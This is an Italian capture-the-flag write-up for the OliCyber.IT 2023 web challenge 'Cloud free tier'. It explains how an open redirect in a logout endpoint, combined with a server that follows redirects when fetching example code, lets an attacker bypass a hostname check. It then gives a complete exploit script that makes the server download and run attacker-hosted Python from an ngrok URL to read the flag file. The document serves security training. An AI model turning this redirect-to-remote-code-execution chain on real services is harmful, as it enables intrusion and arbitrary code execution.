# OliCyber.IT 2023 - Simulazione training camp 1

## [web] Cloud free tier (5 risoluzioni)

La challenge ci presenta un applicazione che vuole essere un piccolo cloud provider che permette di eseguire alcuni codici presi dagli esempi.

Analizzando il codice possiamo notare alcune bad practices:

- L'endpoint di logout esegue un redirect sia che tu sia loggato sia che tu non lo sia:

```python
def logout():
    # Non so se è proprio il modo giusto ma lo vedo su molti siti!
    redirect_url = request.args.get('redirect', '/login')

    try:
        del session['username']
    except:
        pass

    return redirect(redirect_url)
```

- L'endpoint di esecuzione dell'esempio scarica il codice dal sito stesso anziché prenderlo dalla cartella locale

### Soluzione

Una cosa importante da notare è che nello scaricare il file l'endpoint ha abilitato i redirect anche se non ce n'è bisogno:

```python
r = requests.get(file_url, allow_redirects=True)
```

Possiamo dunque sfruttare la open redirect della logout per passare al server una url che passi il controllo sull'hostname:

```python
# Posso usare solo gli esempi locali per adesso
if not file_url.startswith(f'{HOSTNAME}'):
    return abort(403)
```

ma che comunque lo porti a scaricare un codice scritto da noi, in questo modo possiamo ottenere RCE ed esfiltrare la flag.

### Exploit

```python
#!/bin/python3

import requests
import random
import string
import re

def random_string(k=10):
    return ''.join(random.choices(string.ascii_letters, k=k))


base_url = 'http://cloud_free_tier.challs.olicyber.it'

payload_url = 'https://[REDATTO].eu.ngrok.io/prova_rce.py'

"""
File remoto con questo contenuto:

import os
os.system('cat /flag.txt')
"""

username = random_string(k=20)
password = random_string(k=20)

s = requests.Session()

s.post(f'{base_url}/register', data={
    'username': username,
    'password': password
})

s.post(f'{base_url}/run', data={
    'file': f'/logout?redirect={payload_url}'
})

r = s.get(f'{base_url}/history')

result = re.findall('flag\{.*\}', r.text)

print(result[0])

```
